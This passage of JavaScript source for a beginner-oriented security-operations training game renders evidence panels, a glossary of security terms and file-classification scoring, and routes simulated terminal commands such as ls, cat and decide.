    if (L.beginner.prompt) body += `<div class="sim-ev-prompt">${L.beginner.prompt}</div>`;
    if (reveal === 'analyst' || reveal === 'technical') {
      body += `<div class="sim-ev-layer sim-ev-layer--analyst"><span class="sim-ev-layer-label">Analyst notes</span><span class="sim-ev-layer-text">${L.analyst}</span>${evTermsHtml(L.terms)}</div>`;
    }
    if (reveal === 'technical') {
      body += `<div class="sim-ev-layer sim-ev-layer--tech"><span class="sim-ev-layer-label">Technical details</span><pre class="sim-ev-tech">${L.technical}</pre></div>`;
    }
    if (!reveal)                control = layerBtn(e.id, 'analyst', 'Show analyst notes ▾');
    else if (reveal === 'analyst') control = layerBtn(e.id, 'technical', 'Show technical details ▾');
    else                        control = layerBtn(e.id, 'hide', 'Hide details ▴');
  } else {
    body += `<div class="sim-ev-plain">${L.analyst}</div>`;
    body += evTermsHtml(L.terms);
    if (reveal === 'technical') {
      body += `<div class="sim-ev-layer sim-ev-layer--tech"><span class="sim-ev-layer-label">Technical details</span><pre class="sim-ev-tech">${L.technical}</pre></div>`;
      control = layerBtn(e.id, 'hide', 'Hide technical details ▴');
    } else {
      control = layerBtn(e.id, 'technical', 'Show technical details ▾');
    }
  }

  return `
    <div class="sim-ev-item sim-ev-item--${mode}">
      <div class="sim-ev-meta">
        <span class="sim-ev-quality">${tier} FINDING</span>
        <span class="sim-ev-src">${e.source || ''}</span>
      </div>
      <div class="sim-ev-content">${body}</div>
      <div class="sim-ev-controls">${control}</div>
    </div>`;
}
function layerBtn(id, level, label) {
  return `<button type="button" class="sim-ev-more" data-ev-reveal="${id}" data-ev-level="${level}">${label}</button>`;
}

/* The first surfaced evidence item that carries a reflection config. */
function activeReflectionEv() {
  return simEvidenceDefs().find(e => e.reflection && SIM.evidence.has(e.id)) || null;
}

/* "What concerns you?" — a checklist of plain-language observations followed by
 * a Benign / Suspicious / Malicious judgment. This teaches analytical thinking;
 * it is intentionally UNGRADED and touches no resources, flags, or scoring. */
function reflectionCardHtml(e) {
  const r = e.reflection;
  const st = SIM.reflection;
  const concerns = (r.concerns || []).map((c, i) => {
    const on = st.concerns.has(i);
    return `<button type="button" class="sim-concern${on ? ' sim-concern--on' : ''}" data-concern="${i}" aria-pressed="${on}">` +
      `<span class="sim-concern-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${c}</span></button>`;
  }).join('');
  const judgments = JUDGMENTS.map(j =>
    `<button type="button" class="sim-judgment${st.judgment === j ? ' sim-judgment--on' : ''}" data-judgment="${j}" aria-pressed="${st.judgment === j}">${j}</button>`
  ).join('');
  const feedback = st.judgment
    ? `<div class="sim-reflect-feedback"><span class="sim-reflect-feedback-label">Analyst note</span>${r.feedback || ''}</div>`
    : '';
  return `
    <div class="sim-reflect">
      <div class="sim-reflect-head">${r.title || 'REVIEW THE SUSPICIOUS ACTIVITY'}</div>
      <div class="sim-reflect-prompt">${r.prompt || 'What concerns you?'}</div>
      <div class="sim-reflect-concerns">${concerns}</div>
      <div class="sim-reflect-prompt sim-reflect-prompt--judge">${r.judgmentPrompt || 'Based on your findings, how would you judge this activity?'}</div>
      <div class="sim-reflect-judgments">${judgments}</div>
      ${feedback}
    </div>`;
}

/* File classification rows. Beginner mode adds a plain-language note about what
 * each file holds, plus a legend explaining the four levels (glossary tooltips).
 * Classification logic/scoring is unchanged — only the helper text is new. */
function renderClassifyHtml(mode) {
  const readFiles = simFiles().filter(f => SIM.read.has(f.name));
  if (!readFiles.length) return '';
  const legend = mode === 'beginner' ? classifyLegendHtml() : '';
  const rows = readFiles.map(f => {
    const chosen = SIM.classified[f.name];
    const opts = CLASSIFICATIONS.map(c =>
      `<button type="button" class="sim-classify-btn${chosen === c.id ? ' sim-classify-btn--active' : ''}" data-classify-file="${f.name}" data-classify-val="${c.id}" title="${classDef(c.id)}">${c.label}</button>`
    ).join('');
    const note = (mode === 'beginner' && f.beginnerNote)
      ? `<div class="sim-classify-hint">${f.beginnerNote}</div>` : '';
    return `<div class="sim-classify-row"><div class="sim-classify-file">${f.name}</div>${note}<div class="sim-classify-opts">${opts}</div></div>`;
  }).join('');
  const done = simFiles().filter(f => SIM.classified[f.name]).length;
  return `
    <div class="sim-classify">
      <div class="sim-classify-head">FILE CLASSIFICATION — ${done}/${simFiles().length}</div>
      ${legend}
      ${rows}
    </div>`;
}
function classifyLegendHtml() {
  const chips = CLASSIFICATIONS.map(c => glossaryTermHtml(c.id)).filter(Boolean).join(' ');
  if (!chips) return '';
  return `<div class="sim-classify-legend"><span class="sim-classify-legend-label">What the levels mean:</span> ${chips}</div>`;
}
function classDef(id) { const g = glossaryEntry(id); return g ? g.definition : ''; }

/* ------------------------------------------------------------------ *
 * Panel 3 — Terminal output + action dock
 * ------------------------------------------------------------------ */
function renderTerminalPanel() {
  const out = document.getElementById('simTerminal');
  if (out) {
    out.innerHTML = '';
    const intro = (SIM.def && SIM.def.intro) || [
      { t: 'CyberCorp SOC // Career Operating Center', c: 'head' },
    ];
    intro.forEach(line => simPrint(line.t, line.c));
  }
  const actions = document.getElementById('simActions');
  if (actions) {
    actions.innerHTML = `<p class="sim-empty">Investigate first — review the files, then type <strong>decide</strong> to choose a handling action.</p>`;
  }
}

/* ------------------------------------------------------------------ *
 * Panel 4 — Feedback & Consequence (initial empty state)
 * ------------------------------------------------------------------ */
function renderFeedbackPanel() {
  const host = document.getElementById('simFeedback');
  if (!host) return;
  host.innerHTML = `
    <div class="sim-panel-head">FEEDBACK &amp; CONSEQUENCE</div>
    <div class="sim-feedback-body" id="simFeedbackBody">
      <p class="sim-empty">Your decisions and their organizational consequences will appear here.</p>
    </div>`;
}

/* Terminal print helper (used across P1–P4). */
function simPrint(text, cls) {
  const out = document.getElementById('simTerminal');
  if (!out) return;
  const line = document.createElement('div');
  line.className = 'sim-term-line' + (cls ? ' sim-term-line--' + cls : '');
  line.textContent = text == null ? '' : text;
  out.appendChild(line);
  out.scrollTop = out.scrollHeight;
}

/* ================================================================== *
 * INVESTIGATION ENGINE (P2) — terminal (ls/cat/less), evidence,
 * file classification. Reward is investigation QUALITY (weighted
 * evidence surfaced + files classified correctly), never command count.
 * All content is data-driven.
 * ================================================================== */
const CLASSIFICATIONS = [
  { id: 'public',       label: 'Public' },
  { id: 'internal',     label: 'Internal' },
  { id: 'confidential', label: 'Confidential' },
  { id: 'restricted',   label: 'Restricted' },
];
function classLabel(id) { const c = CLASSIFICATIONS.find(x => x.id === id); return c ? c.label : id; }

/* ================================================================== *
 * PROGRESSIVE EVIDENCE LAYERS — beginner-first presentation
 * ------------------------------------------------------------------ *
 * The investigation engine is unchanged; only HOW evidence reads changes.
 * Every evidence item may carry a `layers` block with three presentation
 * depths so a true beginner reasons about WHAT looks off and WHY before
 * meeting the professional terminology:
 *   layers.beginner = { summary, why, prompt }  (plain language, Layer 1)
 *   layers.analyst  = "semi-technical observation" (Layer 2)
 *   layers.technical= "full professional detail"   (Layer 3)
 *   layers.terms    = ['pii', ...]  glossary keys surfaced with L2/L3
 * The legacy `label` stays as a fallback so missions without layers still
 * render. Shape is generic: future missions / role tiers supply their own.
 * ================================================================== */
const JUDGMENTS = ['Benign', 'Suspicious', 'Malicious'];

/* Reusable glossary. Classification ids (public/internal/confidential/
 * restricted) double as glossary keys so the classification legend reuses
 * the same definitions. Add terms here; reference by key from a dataset. */
const SIM_GLOSSARY = {
  public: {
    term: 'Public',
    definition: 'Information already cleared for anyone to see, such as published marketing material.',
    why: 'Safe to share outside the company — there is no harm if it spreads.',
  },
  internal: {
    term: 'Internal',
    definition: 'Information meant for people inside the company — not secret, but not for outsiders either.',
    why: 'Sending it outside is usually unnecessary and can reveal how the company works.',
  },
  confidential: {
    term: 'Confidential',
    definition: 'Sensitive business information limited to specific people, like negotiated pricing or unannounced plans.',
    why: 'Exposure can damage deals, competitiveness, or partner trust.',
  },
  restricted: {
    term: 'Restricted',
    definition: 'The most tightly controlled information, like employee personal data or regulated payment records.',
    why: 'A leak can trigger legal penalties and real harm — this should never leave the company.',
  },
  pii: {
    term: 'PII',
    definition: 'Personally identifiable information — details that identify a specific person, like names, salaries, or addresses.',
    why: 'If it leaks, real people can be harmed and the company can face legal penalties.',
  },
  pci: {
    term: 'PCI scope',
    definition: 'Payment-card data covered by the PCI security standard — card numbers, payment details, and the systems that touch them.',
    why: 'This data is regulated; mishandling it can mean heavy fines and customer harm.',
  },
  materialNonPublic: {
    term: 'material non-public information',
    definition: 'Significant business information that has not been announced publicly, such as a planned acquisition.',
    why: 'Sharing or acting on it early can break the law and tip off competitors.',
  },

  /* ---- Mission 2 — Network Assets ---- */
  device: {
    term: 'Device',
    definition: 'Any piece of hardware connected to the network — a laptop, server, printer, or phone.',
    why: 'Every device on the network is a way in. One you do not recognize is one you cannot trust.',
  },
  network: {
    term: 'Network',
    definition: 'The system that links devices together so they can share data and talk to each other.',
    why: 'Anything on the same network can often reach the company'+"'"+'s internal systems and files.',
  },
  ipAddress: {
    term: 'IP address',
    definition: 'A numbered address (like 192.168.1.57) that identifies one device on the network.',
    why: 'It tells you which exact device is doing something — your first handle on who is who.',
  },
  service: {
    term: 'Service',
    definition: 'A program running on a device that listens for requests, such as a website, file share, or remote login.',
    why: 'Open services are doors. The more a device exposes, the more an attacker can try to push on.',
  },
  subnet: {
    term: 'Subnet',
    definition: 'A slice of the network grouped under a shared address range, like 192.168.1.0/24.',
    why: 'Devices on the same subnet can usually reach each other directly — useful, and risky.',
  },
  portScan: {
    term: 'Port scan',
    definition: 'Checking a device to see which services (ports) it has open and listening.',
    why: 'It reveals what a device exposes — the same first step an attacker takes.',
  },

  /* ---- Mission 3 — Authentication Activity ---- */
  authentication: {
    term: 'Authentication',
    definition: 'Proving who you are before being let in — typically a username plus a password.',
    why: 'If someone defeats it, they become that user, with all of their access.',
  },
  mfa: {
    term: 'MFA',
    definition: 'Multi-factor authentication — a second proof of identity beyond the password, like a phone code.',
    why: 'It stops most stolen-password attacks. Turning it off is a classic move once an account is taken over.',
  },
  bruteForce: {
    term: 'Brute force',
    definition: 'Guessing a password over and over, often automatically, until one attempt works.',
    why: 'A burst of failed logins followed by a success is a textbook sign of it.',
  },
  credentialCompromise: {
    term: 'Account compromise',
    definition: 'When someone other than the real owner gains control of an account.',
    why: 'The attacker now acts as a trusted insider — much harder to spot than an outsider.',
  },
  impossibleTravel: {
    term: 'Impossible travel',
    definition: 'Two logins from places too far apart to reach in the time between them — so they cannot be the same person.',
    why: 'It is strong evidence that someone else is using the account from another location.',
  },

  /* ---- Mission 4 — Data Exfiltration ---- */
  dataExfiltration: {
    term: 'Data exfiltration',
    definition: 'Copying data out of the company to somewhere an attacker controls — the actual theft of information.',
    why: 'Once data leaves the network you cannot get it back; this is the moment a risk becomes a real breach.',
  },
  dlp: {
    term: 'DLP',
    definition: 'Data-loss prevention — monitoring that watches for sensitive data leaving the network and raises an alert.',
    why: 'A DLP alert on a large outbound transfer is often the first concrete sign that data is being stolen.',
  },
  archive: {
    term: 'Archive',
    definition: 'A single bundled, often compressed, file (like a .zip) that packs many files together.',
    why: 'Attackers archive data first so they can move a whole database out in one quiet upload.',
  },
  incidentResponse: {
    term: 'Incident response',
    definition: 'The organized process of containing, investigating, and recovering from a confirmed security incident.',
    why: 'A confirmed breach needs a coordinated response — not just one analyst acting alone.',
  },
  rootCause: {
    term: 'Root cause',
    definition: 'The underlying reason an incident happened — the entry point or failure that everything else followed from.',
    why: 'Fixing the root cause is what stops the same breach happening again; treating symptoms does not.',
  },
  breachNotification: {
    term: 'Breach notification',
    definition: 'A legal duty to tell regulators and affected people when their personal data has been exposed.',
    why: 'Missing or delaying required notifications turns a breach into fines and lasting loss of trust.',
  },
};
function glossaryEntry(key) { return SIM_GLOSSARY[key] || null; }

/* Normalize an evidence item into the three layers, with the legacy `label`
 * as a fallback so un-layered evidence (or future missions) still render. */
function evLayers(e) {
  const L = (e && e.layers) || {};
  const b = L.beginner || {};
  return {
    beginner: {
      summary: b.summary || (e && e.label) || '',
      why: b.why || '',
      prompt: b.prompt || '',
    },
    analyst: L.analyst || (e && e.label) || '',
    technical: L.technical || (e && e.label) || '',
    terms: Array.isArray(L.terms) ? L.terms : [],
  };
}

/* The active evidence presentation mode (beginner default). */
function evidenceView() { return CAREER.evidenceView === 'analyst' ? 'analyst' : 'beginner'; }
function setEvidenceView(mode) {
  const next = mode === 'analyst' ? 'analyst' : 'beginner';
  if (CAREER.evidenceView === next) return;
  CAREER.evidenceView = next;
  saveCareerState();
  renderEvidencePanel();
}

/* A glossary term rendered as an inline, hover/focus/tap-accessible chip.
 * CSS shows the tooltip on :hover / :focus-within; tap toggles --open via the
 * delegated handler. Definition + "why it matters" come straight from the
 * glossary so terminology stays consistent everywhere it appears. */
function glossaryTermHtml(key) {
  const g = glossaryEntry(key);
  if (!g) return '';
  return `<span class="sim-term-wrap">` +
    `<button type="button" class="sim-term" data-term="${key}" aria-expanded="false">${g.term}</button>` +
    `<span class="sim-tip" role="tooltip">` +
      `<span class="sim-tip-term">${g.term}</span>` +
      `<span class="sim-tip-def">${g.definition}</span>` +
      `<span class="sim-tip-why"><span class="sim-tip-why-label">Why it matters:</span> ${g.why}</span>` +
    `</span></span>`;
}
function evTermsHtml(terms) {
  if (!terms || !terms.length) return '';
  const chips = terms.map(glossaryTermHtml).filter(Boolean).join(' ');
  if (!chips) return '';
  return `<div class="sim-ev-terms"><span class="sim-ev-terms-label">Key terms:</span> ${chips}</div>`;
}

/* Carry-forward flags this mission can raise (persisted into CAREER.missionFlags
 * for later missions to read). Human labels for the debrief. */
const CANON_FLAGS = ['contractorAccessDiscovered', 'sensitiveDataExposed', 'legalReviewTriggered'];
const FLAG_LABELS = {
  contractorAccessDiscovered: 'Contractor access flagged for follow-up',
  sensitiveDataExposed: 'Sensitive-data exposure on record',
  legalReviewTriggered: 'Legal review opened',
};

function simFiles() { return (SIM.def && SIM.def.files) || []; }
function simFileByName(name) { return simFiles().find(f => f.name === name) || null; }
function simEvidenceDefs() { return (SIM.def && SIM.def.evidence) || []; }
function evidenceById(id) { return simEvidenceDefs().find(e => e.id === id) || null; }
function allFilesRead() { return simFiles().length > 0 && simFiles().every(f => SIM.read.has(f.name)); }

/* Fraction (0..1) of total evidence weight surfaced — drives the recommendation
 * engine so thorough investigation, not command volume, earns better outcomes. */
function evidenceQuality() {
  const total = simEvidenceDefs().reduce((s, e) => s + (e.qualityWeight || 0), 0);
  if (total <= 0) return 0;
  let got = 0;
  SIM.evidence.forEach(id => { const e = evidenceById(id); if (e) got += (e.qualityWeight || 0); });
  return Math.min(1, got / total);
}

/* Fraction (0..1) of files classified CORRECTLY against ground truth. This feeds
 * the recommendation engine alongside evidence quality, so misfiling sensitive
 * data (or leaving files unclassified) weakens the case — classification is a
 * real gameplay input, never cosmetic. Measured over EVERY file (the objective
 * is to classify each one), so skipping files costs accuracy. */
function classificationQuality() {
  const files = simFiles();
  if (!files.length) return 0;
  let correct = 0;
  files.forEach(f => { if (SIM.classified[f.name] === f.trueClassification) correct++; });
  return correct / files.length;
}

/* Terminal command router. ls / cat / less per the Mission 1 spec, plus help,
 * clear, and `decide` to reveal the handling actions when the player is ready. */
function simRunCommand(raw) {
  const cmd = String(raw || '').trim();
  if (!cmd) return;
  const promptLabel = (SIM.def && SIM.def.promptLabel) || 'intern@cybercorp:~/release$';
  simPrint(promptLabel + ' ' + cmd, 'cmd');
  const parts = cmd.split(/\s+/);
  const verb = parts[0].toLowerCase();

  // Universal verbs available in every mission.
  if (verb === 'help')  return simCmdHelp();
  if (verb === 'clear') { const out = document.getElementById('simTerminal'); if (out) out.innerHTML = ''; return; }
  if (verb === 'decide' || verb === 'actions') return simRevealActions(true);
  if (verb === 'pwd')   return simCmdPwd();
  if (verb === 'ls' || verb === 'dir') return simCmdList();

  // Command-model missions (M2+) define their own command set.
  if (SIM.def && Array.isArray(SIM.def.commands) && SIM.def.commands.length) {
    return simRunMissionCommand(cmd);
  }

  // File-model missions (Mission 1) — original ls / cat flow.
  const arg = parts.slice(1).join(' ').trim();
  switch (verb) {
    case 'ls':
    case 'dir':    return simCmdLs();
    case 'cat':
    case 'less':
    case 'more':
    case 'open':   return simCmdRead(arg, verb);
    default:
      simPrint(`command not found: ${verb}. Try: ls, cat <file>, less <file>, decide, help.`, 'err');
  }
}

function simCmdHelp() {
  // Command-model missions list their own command set.
  if (SIM.def && Array.isArray(SIM.def.commands) && SIM.def.commands.length) {
    simPrint('Available commands:', 'head');
    SIM.def.commands.forEach(c => {
      const name = (c.match && c.match[0]) || c.id;
      simPrint('  ' + name.padEnd(26) + (c.help || ''), 'dim');
    });
    simPrint('  ' + 'ls'.padEnd(26) + 'list the files in this directory', 'dim');
    simPrint('  ' + 'pwd'.padEnd(26) + 'show the current directory', 'dim');
    simPrint('  ' + 'decide'.padEnd(26) + 'review your findings and choose a response', 'dim');
    simPrint('  ' + 'clear'.padEnd(26) + 'clear the terminal', 'dim');
    return;
  }
  simPrint('Available commands:', 'head');
  simPrint('  ls            list the files queued for release', 'dim');
  simPrint('  cat <file>    read a file (surfaces evidence)', 'dim');
  simPrint('  less <file>   page through a file (same as cat here)', 'dim');
  simPrint('  pwd           show the current directory', 'dim');
  simPrint('  decide        reveal the handling actions when ready', 'dim');
  simPrint('  clear         clear the terminal', 'dim');
}

/* ------------------------------------------------------------------ *
 * COMMAND-MODEL ENGINE (Mission 2+). Missions define `def.commands[]`;
 * each entry prints output, surfaces evidence, and runs a per-command
 * learning loop (observation ▸ / rhetorical question ? / confidence ↑ /
 * next →). Mission 1's file flow is untouched.
 * ------------------------------------------------------------------ */
function normalizeCmd(s) {
  return String(s || '').trim().toLowerCase().replace(/\s+/g, ' ');
}

/* Match a typed command against the active mission's command set: exact
 * normalized match against any alias first, then an arg-bearing prefix match. */
function findMissionCommand(cmd) {
  const norm = normalizeCmd(cmd);
  const cmds = (SIM.def && SIM.def.commands) || [];
  for (const c of cmds) {
    if ((c.match || []).map(normalizeCmd).includes(norm)) return c;
  }
  for (const c of cmds) {
    if ((c.match || []).map(normalizeCmd).some(a => norm === a || norm.startsWith(a + ' '))) return c;
  }
  return null;
}

function simRunMissionCommand(cmd) {
  const c = findMissionCommand(cmd);
  if (!c) {
    const verb = normalizeCmd(cmd).split(' ')[0];
    simPrint(`command not found: ${verb}. Type  help  to see available commands, or  decide  when ready.`, 'err');
    return;
  }
  runCommandEntry(c);
}

/* Run one mission command: print its output, surface evidence on first run,
 * then the presentation-only learning loop. Mirrors Mission 1's first-read gate
 * so re-running a command never double-counts evidence or confidence. */
function runCommandEntry(c) {
  const firstRun = !SIM.ranCommands.has(c.id);
  SIM.ranCommands.add(c.id);

  (c.output || []).forEach(line => {
    if (typeof line === 'string') simPrint('  ' + line, 'file');
    else simPrint(line.t, line.c || 'file');
  });

  if (firstRun) (c.reveals || []).forEach(surfaceEvidence);

  if (c.observation) simPrint('▸ ' + c.observation, 'observe');
  if (c.question)    simPrint('? ' + c.question, 'question');
  if (firstRun && (c.reveals || []).length) {
    simPrint('  confidence ↑ — now ' + investigationConfidence() + '%', 'confidence');
  }
  if (c.next) simPrint('→ Next: ' + c.next, 'next');
  simPrint('', 'spacer');

  renderEvidencePanel();

  if (firstRun && coreCommandsRun() && SIM.stage === 'investigation') {
    simPrint('You have gathered the core evidence. Make your determination in the notebook, then type  decide  to choose a response.', 'ok');
    simRevealActions(false);
  }
}

/* True once every command flagged `core: true` has been run. Gates the "decide"
 * nudge and the thoroughness bonus for command-model missions. */
function coreCommandsRun() {
  const core = ((SIM.def && SIM.def.commands) || []).filter(c => c.core);
  if (!core.length) return false;
  return core.every(c => SIM.ranCommands.has(c.id));
}

/* Mission-agnostic "did the analyst finish the investigation?": all files read
 * for file-model missions, all core commands run for command-model missions. */
function investigationComplete() {
  return simFiles().length ? allFilesRead() : coreCommandsRun();
}

/* The single identification (which device / which account) for command-model
 * missions. Single-select; feeds the recommendation outcome like classification
 * does for Mission 1. */
function setIdentification(id) {
  const idf = SIM.def && SIM.def.identify;
  if (!idf) return;
  if (!(idf.options || []).some(o => o.id === id)) return;
  SIM.identified = id;
  renderEvidencePanel();
}

function identificationQuality() {
  const idf = SIM.def && SIM.def.identify;
  if (!idf) return 0;
  return SIM.identified === idf.correctId ? 1 : 0;
}

function simCmdLs() {
  SIM.listed = true;
  const files = simFiles();
  if (!files.length) { simPrint('release/ is empty.', 'dim'); return; }
  simPrint(`release/  —  ${files.length} files queued for external release`, 'head');
  files.forEach(f => simPrint(`  ${f.name}${SIM.read.has(f.name) ? '   ✓ reviewed' : ''}`, 'file'));
  simPrint('Read each file with  cat <file>  to assess its sensitivity.', 'dim');
}

/* `ls` / `pwd` are universal navigation helpers — non-scoring: they never surface
 * evidence or count as a command run. File-model missions keep the original
 * release-folder listing; command-model missions list the files their commands read. */
function simCmdList() {
  const def = SIM.def;
  if (def && Array.isArray(def.commands) && def.commands.length) return simCmdLsCommands();
  return simCmdLs();
}

/* Derive the readable filenames a command-model mission references from the
 * file-like tokens in its command aliases (e.g. `cat auth.log` -> auth.log).
 * Tokens like 192.168.1.57 or 192.168.1.0/24 are excluded (no alpha extension). */
function missionCommandFiles() {
  const cmds = (SIM.def && SIM.def.commands) || [];
  const seen = new Set();
  const files = [];
  cmds.forEach(c => (c.match || []).forEach(alias => {
    String(alias).split(/\s+/).forEach(tok => {
      if (/^[\w./-]+\.[a-z]{2,4}$/i.test(tok) && !seen.has(tok)) {
        seen.add(tok);
        files.push(tok);
      }
    });
  }));
  return files;
}

function simCmdLsCommands() {
  const files = missionCommandFiles();
  if (!files.length) {
    simPrint('No readable files here — this mission works through live tools.', 'dim');
    simPrint('Type  help  to see the available commands.', 'dim');
    return;
  }
  simPrint(`${files.length} file${files.length === 1 ? '' : 's'} in this directory:`, 'head');
  files.forEach(f => simPrint('  ' + f, 'file'));
  simPrint('Read one with  cat <file>  — or type  help  for the full command list.', 'dim');
}

/* Print the working directory taken from the mission's prompt label. */
function simCmdPwd() {
  const label = (SIM.def && SIM.def.promptLabel) || 'intern@cybercorp:~/release$';
  let path = label.slice(label.lastIndexOf(':') + 1).replace(/\$\s*$/, '').trim();
  if (!path) path = '~';
  simPrint(path.replace(/^~/, '/home/intern'), 'file');
}

function simCmdRead(arg, mode) {
  if (!arg) { simPrint(`usage: ${mode} <file>`, 'err'); return; }
  const file = simFileByName(arg);
  if (!file) { simPrint(`${mode}: ${arg}: No such file. Run  ls  to see the folder.`, 'err'); return; }
  const firstRead = !SIM.read.has(file.name);
  SIM.read.add(file.name);
  simPrint(`── ${file.name} ──────────────────────────`, 'head');
  (file.content || []).forEach(l => simPrint('  ' + l, 'file'));
  simPrint('', 'spacer');
  if (firstRead) (file.evidenceIds || []).forEach(surfaceEvidence);
  renderEvidencePanel();
  if (allFilesRead() && SIM.stage === 'investigation') {
    simPrint('All files reviewed. Classify what you found, then type  decide  to choose a handling action.', 'ok');
    simRevealActions(false);
  }
}

/* Surface one evidence item: add to the set, log it, and raise any discovery
 * flag it carries (e.g. discovering the contractor access). */
function surfaceEvidence(evId) {
  if (SIM.evidence.has(evId)) return;
  const e = evidenceById(evId);
  if (!e) return;
  SIM.evidence.add(evId);
  simPrint('● EVIDENCE: ' + e.label, 'evidence');
  if (e.setFlag) setMissionFlag(e.setFlag, true);
  // Reactive map: refresh the button count, and live-update the overlay if open.
  // Presentation-only — reads SIM.evidence, writes nothing.
  if (missionHasMap()) {
    updateMapButton();
    if (SIM.mapOpen) renderSimMap();
  }
}

function setClassification(fileName, value) {
  if (!simFileByName(fileName)) return;
  if (!CLASSIFICATIONS.some(c => c.id === value)) return;
  SIM.classified[fileName] = value;
  renderEvidencePanel();
}

/* ------------------------------------------------------------------ *
 * Evidence-presentation handlers (Task #91) — PRESENTATION ONLY.
 * None of these touch resources, flags, classification, or scoring.
 * ------------------------------------------------------------------ */
function toggleEvidenceLayer(id, level) {
  if (!id) return;
  if (level === 'hide') delete SIM.evReveal[id];
  else if (level === 'analyst' || level === 'technical') SIM.evReveal[id] = level;
  renderEvidencePanel();
}

/* Tooltip toggle for tap/click — one open at a time. Hover + keyboard focus are
 * handled purely in CSS, so this only manages the tap-to-pin --open state. */
function toggleTerm(btn) {
  const wrap = btn.closest('.sim-term-wrap');
  if (!wrap) return;
  const wasOpen = wrap.classList.contains('sim-term-wrap--open');
  document.querySelectorAll('.sim-term-wrap--open').forEach(w => {
    w.classList.remove('sim-term-wrap--open');
    const b = w.querySelector('.sim-term');
    if (b) b.setAttribute('aria-expanded', 'false');
  });
  if (!wasOpen) {
    wrap.classList.add('sim-term-wrap--open');
    btn.setAttribute('aria-expanded', 'true');
  }
}

function toggleConcern(i) {
  if (!Number.isFinite(i)) return;
  if (SIM.reflection.concerns.has(i)) SIM.reflection.concerns.delete(i);
  else SIM.reflection.concerns.add(i);
  renderEvidencePanel();
}

function setJudgment(j) {
  if (!JUDGMENTS.includes(j)) return;
  SIM.reflection.judgment = j;
  renderEvidencePanel();
}

/* ================================================================== *
 * DECISION + CONSEQUENCE + LOCKED-AUTHORITY + RECOMMENDATION (P3)
 * ================================================================== */
function simRevealActions(manual) {
  if (SIM.stage === 'report') return;   // decision already made
  SIM.stage = 'decision';
  renderActions();
  if (manual && !investigationComplete()) {
    const msg = simFiles().length
      ? 'Note: you have not reviewed every file. Acting on incomplete evidence weakens your recommendation.'
      : 'Note: you have not finished the core investigation. Acting on incomplete evidence weakens your recommendation.';
    simPrint(msg, 'warn');
  }
}

function renderActions() {
  const host = document.getElementById('simActions');
  if (!host || !SIM.def) return;
  const actBtns = (SIM.def.actions || []).map(a => `
    <button type="button" class="sim-action-btn${a.type === 'recommendation' ? ' sim-action-btn--rec' : ''}" data-action="${a.id}">
      <span class="sim-action-btn-label">${a.label}</span>
      <span class="sim-action-btn-desc">${a.summary || ''}</span>
    </button>`).join('');
  const lockBtns = (SIM.def.lockedActions || []).map(a => `
    <button type="button" class="sim-action-btn sim-action-btn--locked" data-locked="${a.id}">
      <span class="sim-action-btn-label">${a.label}</span>
      <span class="sim-action-btn-desc">Beyond your current authority — see why.</span>
    </button>`).join('');
  host.innerHTML = `
    <div class="sim-actions-head">CHOOSE A HANDLING ACTION</div>
    <div class="sim-actions-grid">${actBtns}${lockBtns}</div>`;
}

function chooseAction(actionId) {
  if (SIM.stage === 'report') return;
  const action = (SIM.def.actions || []).find(a => a.id === actionId);
  if (!action) return;

  // Recommendation-type actions are judged by leadership: the outcome scales
  // their effect (or, if Denied, costs a little standing instead).
  let outcome = null;
  let deltas = { ...(action.deltas || {}) };
  if (action.type === 'recommendation') {
    outcome = computeRecommendationOutcome();
    if (outcome.verdict === 'Denied') deltas = { careerReputation: -5, executiveTrust: -4, complianceExposure: 5 };
    else deltas = scaleDeltas(deltas, outcome.multiplier);
  }
  // Fold in any dynamic carry-flag deltas (UNSCALED) so prior-mission
  // consequences move resources without distorting the leadership verdict.
  const changes = applyResourceDeltas(mergeDeltas(deltas, dynamicDeltaMods(SIM.dynamic)));
  const denied = outcome && outcome.verdict === 'Denied';
  if (!denied) (action.setFlags || []).forEach(f => setMissionFlag(f, true));

  SIM.decision = { actionId, outcome, changes };
  SIM.stage = 'report';
  const dock = document.getElementById('simActions');
  if (dock) dock.innerHTML = `<p class="sim-empty">Decision recorded: <strong>${action.label}</strong>. See the debrief →</p>`;
  simPrint(`> Decision: ${action.label}${outcome ? ' — ' + outcome.verdict : ''}`, 'ok');
  renderDebrief(action, outcome, changes);
  finalizeMission({ decisionLabel: action.label, decisionKind: action.type || 'direct', verdict: outcome ? outcome.verdict : null, changes });
}

function chooseLockedAction(id) {
  const a = (SIM.def.lockedActions || []).find(x => x.id === id);
  if (!a) return;
  const host = document.getElementById('simFeedback');
  if (!host) return;
  const recId = a.alternativeRecommendationId;
  const rec = recId ? (SIM.def.recommendations || {})[recId] : null;
  host.innerHTML = `
    <div class="sim-panel-head">FEEDBACK &amp; CONSEQUENCE</div>
    <div class="sim-feedback-body">
      <div class="sim-locked-note">
        <div class="sim-locked-title">ACTION LOCKED — ${a.label}</div>
        <div class="sim-locked-why">${a.reason}</div>
        ${rec ? `<button type="button" class="sim-locked-alt" data-rec="${recId}">Alternative available — Submit Recommendation: ${rec.label}</button>` : ''}
      </div>
    </div>`;
}

function submitRecommendation(recId) {
  if (SIM.stage === 'report') return;
  const rec = (SIM.def.recommendations || {})[recId];
  if (!rec) return;
  const outcome = computeRecommendationOutcome();
  let deltas;
  if (outcome.verdict === 'Denied') deltas = { careerReputation: -5, executiveTrust: -4, complianceExposure: 5 };
  else deltas = scaleDeltas(rec.deltas || {}, outcome.multiplier);
  // Fold in any dynamic carry-flag deltas (UNSCALED) — see chooseAction.
  const changes = applyResourceDeltas(mergeDeltas(deltas, dynamicDeltaMods(SIM.dynamic)));
  if (outcome.verdict !== 'Denied') (rec.setFlags || []).forEach(f => setMissionFlag(f, true));

  SIM.decision = { recommendationId: recId, outcome, changes };
  SIM.stage = 'report';
  const dock = document.getElementById('simActions');
  if (dock) dock.innerHTML = `<p class="sim-empty">Recommendation submitted: <strong>${rec.label}</strong>. See the debrief →</p>`;
  simPrint(`> Recommendation submitted: ${rec.label} — ${outcome.verdict}`, 'ok');
  renderDebrief(
    { label: 'Recommendation: ' + rec.label, consequence: rec.consequence, setFlags: rec.setFlags, deniedNote: rec.deniedNote, outcomeSub: 'Submitted to leadership for a decision.' },
    outcome, changes
  );
  finalizeMission({ decisionLabel: rec.label, decisionKind: 'recommendation', verdict: outcome.verdict, changes });
}

/* RECOMMENDATION ENGINE — outcome from evidence quality + severity + executive
 * trust + career reputation + timing (evidence gathered before deciding). */
function computeRecommendationOutcome() {
  const q = evidenceQuality();
  // Accuracy is the mission's "did you get the right answer" input. File-model
